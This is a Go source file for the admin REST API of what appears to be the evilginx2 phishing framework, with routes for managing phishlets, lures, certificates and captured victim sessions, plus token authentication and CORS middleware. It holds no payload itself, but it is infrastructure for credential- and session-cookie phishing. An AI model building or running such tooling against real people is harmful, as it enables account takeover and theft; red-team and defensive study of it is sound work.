package api

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/kgretzky/evilginx2/internal/phishlet"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/pkg/models"
)

type Server struct {
	router       *gin.Engine
	storage      storage.Interface
	config       *models.Config
	port         string
	server       *http.Server
	phishletRepo *phishlet.PhishletRepository
	handlers     *Handlers
}

type Handlers struct {
	storage      storage.Interface
	phishletRepo *phishlet.PhishletRepository
}

func NewServer(storage storage.Interface, config *models.Config, port string, phishletRepo *phishlet.PhishletRepository) *Server {
	gin.SetMode(gin.ReleaseMode)
	
	handlers := &Handlers{
		storage:      storage,
		phishletRepo: phishletRepo,
	}
	
	s := &Server{
		router:       gin.Default(),
		storage:      storage,
		config:       config,
		port:         port,
		phishletRepo: phishletRepo,
		handlers:     handlers,
	}
	
	s.setupMiddleware()
	s.setupRoutes()
	
	return s
}

func (s *Server) setupMiddleware() {
	s.router.Use(gin.Recovery())
	s.router.Use(func(c *gin.Context) {
		c.Header("Content-Type", "application/json")
		c.Header("X-Content-Type-Options", "nosniff")
		c.Header("X-Frame-Options", "DENY")
		c.Header("X-XSS-Protection", "1; mode=block")
		c.Next()
	})

	allowedOrigin := getenvDefault("FRONTEND_ORIGIN", "http://localhost:5173")
	s.router.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", allowedOrigin)
		c.Writer.Header().Set("Access-Control-Allow-Credentials", "true")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		if c.Request.Method == http.MethodOptions {
			c.AbortWithStatus(http.StatusNoContent)
			return
		}
		c.Next()
	})

	s.router.Use(func(c *gin.Context) {
		if c.Request.Method == http.MethodGet && c.Request.URL.Path == "/api/v1/health" {
			c.Next()
			return
		}
		auth := c.GetHeader("Authorization")
		token := strings.TrimPrefix(auth, "Bearer ")
		expected := os.Getenv("API_ADMIN_TOKEN")
		if expected == "" || token != expected {
			c.AbortWithStatusJSON(http.StatusUnauthorized, gin.H{"error": "unauthorized"})
			return
		}
		c.Next()
	})

	s.router.Use(func(c *gin.Context) {
		start := time.Now()
		c.Next()
		duration := time.Since(start)
		fmt.Printf("[API] %s %s - %d (%v)\n",
			c.Request.Method,
			c.Request.URL.Path,
			c.Writer.Status(),
			duration)
	})
}

func (s *Server) setupRoutes() {
	api := s.router.Group("/api/v1")

	api.GET("/health", s.healthCheck)

	phishlets := api.Group("/phishlets")
	phishlets.GET("", s.listPhishlets)
	phishlets.POST("", s.createPhishlet)
	phishlets.GET("/:name", s.getPhishlet)
	phishlets.PUT("/:name", s.updatePhishlet)
	phishlets.DELETE("/:name", s.deletePhishlet)
	phishlets.GET("/:name/stats", s.getPhishletStats)
	phishlets.GET("/:name/versions", s.listPhishletVersions)
	phishlets.POST("/:name/versions", s.createPhishletVersion)
	phishlets.GET("/:name/versions/:version", s.getPhishletVersion)
	phishlets.POST("/:name/evaluate", s.evaluateConditions)
	phishlets.GET("/:name/flows", s.getMultiPageFlows)
	phishlets.POST("/:name/flows/:flow/step", s.updateFlowStep)


	sessions := api.Group("/sessions")
	sessions.GET("", s.listSessions)
	sessions.POST("", s.createSession)
	sessions.GET("/:id", s.getSession)
	sessions.PUT("/:id", s.updateSession)
	sessions.DELETE("/:id", s.deleteSession)
	sessions.GET("/stats", s.getSessionStats)

	lures := api.Group("/lures")
	lures.GET("", s.listLures)
	lures.POST("", s.createLure)
	lures.GET("/:id", s.getLure)
	lures.PUT("/:id", s.updateLure)
	lures.DELETE("/:id", s.deleteLure)

	certs := api.Group("/certificates")
	certs.GET("", s.listCertificates)
	certs.POST("", s.generateCertificate)
	certs.DELETE("/:domain", s.deleteCertificate)

	config := api.Group("/config")
	config.GET("", s.getConfig)
	config.PUT("", s.updateConfig)
}

func (s *Server) Start(ctx context.Context) error {
	s.server = &http.Server{
		Addr:    ":" + s.port,
		Handler: s.router,
	}
	
	fmt.Printf("Starting API server on port %s\n", s.port)
	
	go func() {
		<-ctx.Done()
		shutdownCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		s.server.Shutdown(shutdownCtx)
	}()
	
	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		return fmt.Errorf("failed to start server: %w", err)
	}
	
	return nil
}

func (s *Server) Stop() error {
	if s.server != nil {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		return s.server.Shutdown(ctx)
	}
	return nil
}

func (s *Server) healthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status":    "healthy",
		"timestamp": time.Now().UTC(),
		"version":   "1.0.0",
	})
}
func getenvDefault(key, def string) string {
	v := os.Getenv(key)
	if v == "" {
		return def
	}
	return v
}
